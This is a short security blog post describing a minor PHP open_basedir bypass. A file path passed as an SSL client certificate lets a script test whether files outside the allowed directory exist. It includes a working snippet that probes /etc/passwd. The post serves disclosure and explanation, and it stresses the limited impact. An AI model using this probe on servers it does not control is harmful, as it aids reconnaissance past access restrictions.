---
layout: post
title: "Checking whether files exist outside open_basedir"
thumbnail: brick-wall-240.jpg
date: 2017-04-26
---

PHP's [`open_basedir`](http://php.net/manual/en/ini.core.php#ini.open-basedir) setting limits the files that can be accessed by PHP to the specified directory. It should not be possible to access files outside of the directory set as `open_basedir`. However, it is still possible to check whether files exist because the file used as client certificate in an SSL connection is not checked against `open_basedir`.

## How open_basedir works

The files that PHP can access can be restricted with the `open_basedir` option. For example, if `open_basedir` is set to `/home/users/sjoerd`, the script can not access any files in `/home/users/john`. Here is an example:

    <?php
        ini_set('open_basedir', getcwd());
        readfile('/etc/passwd');
    ?>

This sets the `open_basedir` setting to the current directory and then tries to read the file `/etc/passwd`, which is outside of the `open_basedir`. This results in the following warnings:

    Warning: readfile(): open_basedir restriction in effect. File(/etc/passwd) is not within the allowed path(s): (/test) in test.php on line 3
    Warning: readfile(/etc/passwd): failed to open stream: Operation not permitted in test.php on line 3

## Checking files outside of the open_basedir

Almost all file access in PHP is checked against the `open_basedir` setting. One place where this check is missing is on the client certificate file in a SSL connection.

    <?php
        $context = stream_context_create(array(
            'ssl' => array(
                'local_cert' => '/etc/passwd'
            )
        ));

        fopen('https://www.google.com/', 'r', false, $context);
    ?>

If the file passed as `local_cert` does not exist, the connection is set up and no warning is given. However, if the file does exist, the connection is aborted and the following warnings are emitted:

    Warning: fopen(): Unable to set local cert chain file `/etc/passwd'; Check that your cafile/capath settings include details of your certificate and its issuer in check.php on line 8
    Warning: fopen(): Failed to enable crypto in check.php on line 8
    Warning: fopen(https://www.google.com/): failed to open stream: operation failed in check.php on line 8

This difference in behavior makes it possible to check whether a file exists outside of the `open_basedir`. By checking the warnings or the HTTPS connection we can check whether the file exists.

## Limited impact

The `open_basedir` setting is not really meant for locking in users that can run arbitrary PHP code, but rather as an additional security measure for scripts that handle files. As such, bypassing it with the above example is not really a shocking security vulnerability.

## Conclusion

You can check whether files outside the `open_basedir` exist, but only if you can run arbitrary PHP code anyway.
